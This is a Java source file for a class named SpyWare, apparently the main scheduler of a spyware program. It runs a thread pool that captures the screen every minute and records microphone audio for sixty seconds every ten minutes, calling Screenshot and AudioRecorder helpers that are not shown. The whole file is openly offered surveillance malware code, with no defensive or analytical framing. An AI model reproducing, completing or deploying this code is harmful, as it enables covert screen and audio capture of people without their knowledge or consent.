package spy;

import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class SpyWare {

    /**
     * Voice recording duration
     */
    private static final long RECORD_TIME = 60000;

    public static void main(String[] args) {
        Runnable screenshotRunnable = Screenshot::captureScreen;
        Runnable recorderRunnable = SpyWare::recorderThread;
        scheduledSpyWork(screenshotRunnable, recorderRunnable);
    }

    /**
     * Starts recording and stop until the duration.
     */
    public static void recorderThread() {
        AudioRecorder audioRecorder = new AudioRecorder();
        Runnable runnable = () -> audioRecorder.stopRecordingAudio(RECORD_TIME);
        Thread stopper = new Thread(runnable);
        stopper.start();
        audioRecorder.startRecording();
    }

    /**
     * Defines scheduled pool of 2 threads. Initially we will add both
     * runnable of taking screenshot and voice recorder.
     * In every minute a screenshot will be captured and after every 10
     * minutes a voice will be recording for a specific amount of time.
     *
     * @param screenshotRunnable takes screenshot
     * @param recorderRunnable records voice
     */
    public static void scheduledSpyWork(Runnable screenshotRunnable,
                                        Runnable recorderRunnable) {
        // Initialize scheduled thread pool.
        ScheduledThreadPoolExecutor scheduledThreadPoolExecutor =
                new ScheduledThreadPoolExecutor(2);
        // execute runnable in thread pool. screen capture and voice recorder
        scheduledThreadPoolExecutor.scheduleWithFixedDelay(screenshotRunnable,
                0,1, TimeUnit.MINUTES);
        scheduledThreadPoolExecutor.scheduleWithFixedDelay(recorderRunnable,
                0, 10, TimeUnit.MINUTES);
    }
}
